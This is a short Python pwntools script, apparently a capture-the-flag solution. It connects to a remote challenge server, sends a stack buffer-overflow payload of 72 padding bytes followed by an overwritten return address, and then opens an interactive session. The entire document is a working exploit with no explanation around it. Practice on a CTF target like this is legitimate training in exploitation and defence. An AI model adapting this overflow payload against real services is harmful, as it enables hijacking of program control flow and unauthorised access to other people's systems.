from pwn import *

payload = 'A'*72+'\x37\x06\x40\x00\x00\x00\x00\x00'
p = remote('ctf.bitx.tw', 10101)
print p.recvuntil('buffer')
p.sendline(payload)
p.interactive()

